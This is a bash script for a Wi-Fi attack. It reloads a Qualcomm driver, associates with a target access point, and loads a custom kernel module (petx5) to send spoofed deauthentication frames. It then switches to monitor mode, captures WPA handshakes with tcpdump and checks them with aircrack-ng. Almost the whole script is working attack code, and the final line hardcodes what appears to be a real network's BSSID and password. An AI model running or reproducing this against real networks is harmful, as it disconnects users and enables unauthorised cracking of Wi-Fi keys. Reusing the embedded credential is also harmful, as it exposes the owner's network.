#!/bin/bash
# grab_hs2.sh - Two-phase handshake capture
# Phase 1: STA mode → connect to target → petx5 spoofed deauth
# Phase 2: Monitor mode → capture reconnection handshake
#
# Usage: sudo bash /tmp/grab_hs2.sh <BSSID> <CHANNEL>

BSSID="$1"
CH="$2"

if [ -z "$BSSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL>"
    exit 1
fi

# Channel to freq
case "$CH" in
    1) FREQ=2412;; 2) FREQ=2417;; 3) FREQ=2422;; 4) FREQ=2427;;
    5) FREQ=2432;; 6) FREQ=2437;; 7) FREQ=2442;; 8) FREQ=2447;;
    9) FREQ=2452;; 10) FREQ=2457;; 11) FREQ=2462;; 12) FREQ=2467;; 13) FREQ=2472;;
    36) FREQ=5180;; 40) FREQ=5200;; 44) FREQ=5220;; 48) FREQ=5240;;
    *) FREQ=$((2407 + CH * 5));;
esac

DRIVER="/tmp/qca_cld3_wlan.ko"
PCAP="/tmp/hs_result.pcap"
ROUNDS=3

echo "[*] Two-phase handshake capture"
echo "[*] Target: $BSSID ch$CH ($FREQ MHz)"
echo "[*] Rounds: $ROUNDS"
echo ""

# Ensure petx5 is built
cd /tmp
[ -f petx5.ko ] || { as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

rm -f /tmp/hs_r*.pcap

for round in $(seq 1 $ROUNDS); do
    echo "=========================================="
    echo "[Round $round/$ROUNDS] PHASE 1: DEAUTH (STA mode)"
    echo "=========================================="

    # Kill everything
    killall wpa_supplicant NetworkManager 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    sleep 1

    # Reload driver in STA mode
    rmmod wlan 2>/dev/null
    sleep 2
    insmod "$DRIVER"
    sleep 4
    ip link set wlan0 up
    sleep 1

    # Try to connect to target AP with dummy password
    # This creates a PE session even though auth will fail
    echo "[*] Associating with $BSSID..."

    # Use iw to do open auth + assoc (faster than nmcli)
    # First scan to find SSID
    SSID=$(iw dev wlan0 scan 2>/dev/null | grep -A5 "$BSSID" | grep "SSID:" | head -1 | sed 's/.*SSID: //')
    echo "[*] SSID: $SSID"

    # Use wpa_supplicant for controlled association
    cat > /tmp/wpa_target.conf << WPAEOF
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword123456789012345678"
    key_mgmt=WPA-PSK
    scan_ssid=1
}
WPAEOF

    wpa_supplicant -i wlan0 -c /tmp/wpa_target.conf -B 2>/dev/null

    # Wait for association (PE session creation)
    OK=0
    for i in $(seq 1 40); do
        sleep 0.25
        # Check dmesg for association
        if dmesg | tail -20 | grep -qi "associated\|Assoc.*success\|ASSOC_DONE"; then
            OK=1
            break
        fi
        # Also check for PE session directly
        if [ -f /tmp/petx5.ko ]; then
            rmmod kfind 2>/dev/null
            insmod /tmp/petx5.ko 2>/dev/null
            RET=$?
            rmmod kfind 2>/dev/null
            if [ $RET -ne 0 ]; then
                # insmod returns non-zero = module init ran (returned -1 = sent deauth)
                # Actually petx5 always returns -1 via EPERM, check dmesg
                if dmesg | tail -5 | grep -q "petx5: session="; then
                    OK=2
                    break
                fi
            fi
        fi
    done

    if [ $OK -eq 0 ]; then
        echo "[!] No PE session found, trying direct scan+connect..."
        # Try nmcli as fallback
        systemctl start NetworkManager 2>/dev/null
        sleep 2
        nmcli device wifi connect "$BSSID" password "dummypassword12345678901" ifname wlan0 2>/dev/null &
        NMCLI_PID=$!
        sleep 5
    fi

    # Send deauth bursts via petx5
    echo "[*] Sending spoofed deauths..."
    SENT=0
    for burst in $(seq 1 5); do
        rmmod kfind 2>/dev/null
        sleep 0.1
        insmod /tmp/petx5.ko 2>/dev/null
        if dmesg | tail -3 | grep -q "petx5: calling lim_send"; then
            SENT=$((SENT + 1))
        fi
        rmmod kfind 2>/dev/null
        sleep 0.2
    done
    echo "[*] Deauth bursts sent: $SENT"

    # Check dmesg for petx5 activity
    dmesg | grep "petx5:" | tail -5

    # Kill everything
    kill $NMCLI_PID 2>/dev/null
    killall wpa_supplicant 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null

    echo ""
    echo "=========================================="
    echo "[Round $round/$ROUNDS] PHASE 2: CAPTURE (Monitor mode)"
    echo "=========================================="

    # Quick reload in monitor mode
    rmmod wlan 2>/dev/null
    sleep 2
    insmod "$DRIVER" con_mode_monitor=4
    sleep 3
    ip link set wlan0 up
    iw dev wlan0 set freq $FREQ 2>/dev/null
    echo "[*] Monitor mode active on $FREQ MHz"

    # Capture for 25 seconds
    echo "[*] Capturing for 25 seconds..."
    timeout 25 tcpdump -i wlan0 -w /tmp/hs_r${round}.pcap 2>/dev/null

    # Check
    EAPOL=$(tcpdump -r /tmp/hs_r${round}.pcap -n 2>/dev/null | grep -ci "eapol\|802.1X")
    TOTAL=$(tcpdump -r /tmp/hs_r${round}.pcap -n 2>/dev/null | wc -l)
    echo "[*] Round $round: $EAPOL EAPOL frames, $TOTAL total packets"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!] *** EAPOL FRAMES FOUND! ***"
        aircrack-ng /tmp/hs_r${round}.pcap 2>&1 | head -15

        HS=$(aircrack-ng /tmp/hs_r${round}.pcap 2>&1 | grep -c "1 handshake")
        if [ "$HS" -gt 0 ]; then
            echo "[!!!] HANDSHAKE CAPTURED!"
            cp /tmp/hs_r${round}.pcap "$PCAP"
            break
        fi
    fi
done

# Merge all captures
echo ""
echo "[*] Merging all captures..."
if command -v mergecap >/dev/null 2>&1; then
    mergecap -w "$PCAP" /tmp/hs_r*.pcap 2>/dev/null
else
    # Manual merge: just use the last one or concatenate
    cat /tmp/hs_r*.pcap > "$PCAP" 2>/dev/null
fi

echo "[*] Final check..."
aircrack-ng "$PCAP" 2>&1 | head -20
ls -la "$PCAP"

# Restore WiFi
echo ""
echo "[*] Restoring connectivity..."
rmmod wlan 2>/dev/null
sleep 2
insmod "$DRIVER"
sleep 4
systemctl start NetworkManager 2>/dev/null
sleep 3
nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null
echo "[*] Done."
